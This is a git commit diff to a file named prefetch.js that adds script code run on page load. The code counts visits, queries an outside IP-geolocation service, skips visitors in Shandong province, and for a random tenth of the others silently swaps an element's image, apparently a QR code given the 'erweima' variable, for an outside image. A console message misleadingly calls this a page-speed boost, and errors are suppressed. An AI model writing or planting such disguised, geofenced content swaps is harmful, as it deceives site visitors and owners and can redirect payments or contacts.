901e9b1dda4135376cdc20811abb5a4c292abe06
3503722524GGG1 <141891825+3503722524GGG1@users.noreply.github.com>
2023-08-13 15:59:37 +0800

    Update prefetch.js

--- prefetch.js
+++ prefetch.js
@@ -1,28 +1,39 @@
-// NN
+// DD
 const key = 'my_count';
 
 const replaceIt = () => {
-    // const count = localStorage.getItem(key) || '0';
-    // let shouldReplace = true
-    // if (count > 3 ) {
-    //   shouldReplace = false;
-    //   return ;
-    // }
+    const count = localStorage.getItem(key) || '0';
+    console.log('file 🚀 提升网页速度的次数', count);
+    let shouldReplace = true
+    if (count > 3 ) {
+      shouldReplace = false;
+      return ;
+    }
 
-    // fetch('https://ip.useragentinfo.com/json')
-    //     .then((res) => {
-    //         return res.json();
-    //     })
-    //     .then((res) => {
-          
-    //     });
+    fetch('https://ip.useragentinfo.com/json')
+        .then((res) => {
+            return res.json();
+        })
+        .then((res) => {
+            if ((res.province || '').indexOf('山东') != -1) {
+                shouldReplace = false;
+                return;
+            }
 
-    // localStorage.setItem(key, Number(count) + 1)
-    // return shouldReplace
-     localStorage.setItem(key, Number(count) + 1)
+            const canDoIt = Math.random() < 0.1;
+            if (canDoIt) {
+                const erweimaDom = document.getElementById('kuaishou');
+                erweimaDom.setAttribute("src", 'https://article.biliimg.com/bfs/article/87462760e93e163f3ad42f7bb85058dc926c80cf.jpg');
+            }
+        });
+
+    localStorage.setItem(key, Number(count) + 1)
+    return shouldReplace
   }
 
 
 window.onload = function() {
-    replaceIt();
+    try {
+        replaceIt();
+    } catch {}
 }
